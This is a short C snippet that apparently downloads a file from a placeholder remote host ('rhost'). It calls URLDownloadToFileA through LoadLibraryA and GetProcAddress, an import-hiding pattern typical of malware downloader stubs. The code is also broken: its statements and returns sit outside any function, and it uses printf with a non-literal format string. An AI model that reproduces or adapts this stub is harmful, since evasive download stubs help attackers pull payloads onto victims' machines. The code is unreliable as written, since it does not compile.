#include <windows.h>
#include <stdio.h>

#define MAX_LINE 512

char url[MAX_LINE] = "https://rhost";
char destination[MAX_LINE] = "destinationFile.txt";
char buffer[MAX_LINE];

HRESULT dl;

typedef HRESULT (WINAPI * URLDownloadToFileA_t)(LPUNKNOWN pCaller, LPCSTR szURL, LPCSTR szFileName, DWORD dwReserved, void * lpfnCB);
URLDownloadToFileA_t xURLDownloadToFileA;
xURLDownloadToFileA = (URLDownloadToFileA_t)GetProcAddress(LoadLibraryA("urlmon"), "URLDownloadToFileA");

dl = xURLDownloadToFileA(NULL, url, destination, 0, NULL);

sprintf( buffer, "Downloading File From: %s, To: %s", url, destination);

if (dl == S_OK) 
{
    sprintf(buffer, "File Successfully Downloaded To: %s", destination);
    printf(buffer);
} 
else if (dl == E_OUTOFMEMORY) 
{
    sprintf(buffer, "Failed To Download File Reason: Insufficient Memory");
    printf(buffer);
    return 0;
} 
else
{
    sprintf(buffer, "Failed To Download File Reason: Unknown");
    printf(buffer);
    return 0;
}

